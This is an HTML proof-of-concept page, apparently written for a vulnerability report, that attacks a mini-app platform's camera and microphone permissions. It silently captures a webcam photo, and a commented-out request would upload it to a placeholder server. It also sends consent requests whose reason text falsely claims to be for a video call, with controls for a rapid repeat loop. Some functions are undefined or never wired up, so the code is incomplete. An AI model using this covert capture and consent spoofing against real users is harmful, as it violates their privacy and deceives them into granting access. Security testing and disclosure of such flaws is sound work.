<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SpyCam MiniApp</title>
  <style>
  body { font-family: -apple-system, system-ui, sans-serif; margin: 0; background: #111; color: #eee; padding: 16px; }
  h1 { font-size: 18px; } h2 { font-size: 15px; margin: 20px 0 8px; }
  .card { background: #1c1c1e; border: 1px solid #333; border-radius: 12px; padding: 12px; margin-bottom: 12px; }
  button { display: block; width: 100%; box-sizing: border-box; padding: 14px; margin: 6px 0; border-radius: 12px;
           border: 0; font-size: 16px; font-weight: 600; }
  .primary { background: #0a84ff; color: #fff; }
  .danger  { background: #ff453a; color: #fff; }
  .muted   { background: #333; color: #ccc; }
  pre { background: #000; border-radius: 8px; padding: 10px; font-size: 11px; max-height: 200px;
        overflow: auto; white-space: pre-wrap; word-break: break-all; }
  .stat { display: flex; gap: 8px; }
  .stat > div { flex: 1; background: #000; border-radius: 8px; padding: 8px; text-align: center; }
  .stat b { display: block; font-size: 22px; }
  label { display: block; margin: 8px 0 2px; font-size: 13px; color: #999; }
  input[type=text], select { width: 100%; box-sizing: border-box; padding: 10px; border-radius: 8px;
        border: 1px solid #444; background: #000; color: #eee; font-size: 14px; }
  .warn { color: #ffd60a; font-size: 12px; }
  .ok { color: #30d158; } .bad { color: #ff453a; }
</style>
  <script type="module" src="/test_webapp/max-web-app.mjs"></script>
   <script>
    async function capture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        await new Promise(resolve => video.onloadedmetadata = resolve);

        // Немного подождём, чтобы камера точно успела включиться
        await new Promise(res => setTimeout(res, 700));

        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Останавливаем камеру
        stream.getTracks().forEach(track => track.stop());

        // Показываем фото
        const photo = document.getElementById('photo');
        photo.src = canvas.toDataURL('image/png');

        // Убираем видео
        video.style.display = 'none';

        // Если нужно отправить фото:
        /*
        fetch('https://your-server.com/upload', {
          method: 'POST',
          body: JSON.stringify({ image: photo.src }),
          headers: { 'Content-Type': 'application/json' }
        });
        */

      } catch (err) {
        document.body.innerHTML = '<h2>❌ Камера недоступна</h2>';
        console.error(err);
      }
    }
function RequestOnce() {
    var pm = window.WebApp.PermissionsManager;
    var reason = document.getElementById('reason').value || undefined;

    var p;
    if (pm && typeof pm.requestAccess === 'function') {
      // Высокий уровень: SDK сам подставит queryId (withQueryId).
      p = Promise.resolve().then(function () { return pm.requestAccess(permsArray(), reason); });
    } else if (window.WebApp.requestController.createRequest) {
      // Низкий уровень: точная полезная нагрузка как в техспеке.
      var permissions = permsArray().map(function (k) { return k === 'camera' ? { camera: true } : { mic: true }; });
      p = window.WebApp.requestController.createRequest('WebAppPermissionsRequestAccess', {
        reason: reason, permissions: permissions
      });
    } else {
      return Promise.reject(new Error('bridge недоступен: нет WebApp.PermissionsManager / requestController'));
    }
  }
 
  </script>
</head>
  
    
<body>
  <h2>Smile for the camera 😈</h2>
  <button onclick="capture()">Start Camera Capture with getUserMedia</button>
  <button onclick="RequestOnce()">Request Access to Camera stream</button>

  <div class="card">
  <h2>Управление</h2>
  <button class="primary" id="btn-start">Запустить цикл requestAccess</button>
  <button class="danger"  id="btn-stop" disabled>Остановить</button>
  <label>Пауза между запросами, мс (0 = сразу после ответа)
    <input type="text" id="delay" value="0" inputmode="numeric" />
  </label>
  <label>reason (текст в диалоге согласия — вектор L-2)
    <input type="text" id="reason" value="[PoC MAXIS-1808] Подтвердите доступ к камере для продолжения видеосвязи" />
  </label>
  <label>Разрешения
    <select id="perms">
      <option value="camera">camera</option>
      <option value="mic">mic</option>
      <option value="both" selected>camera + mic</option>
    </select>
  </label>
  <button class="muted" id="btn-single">Одиночный requestAccess (для сравнения)</button>
</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <img id="photo" alt="Captured image will appear here">

</body>
</html>
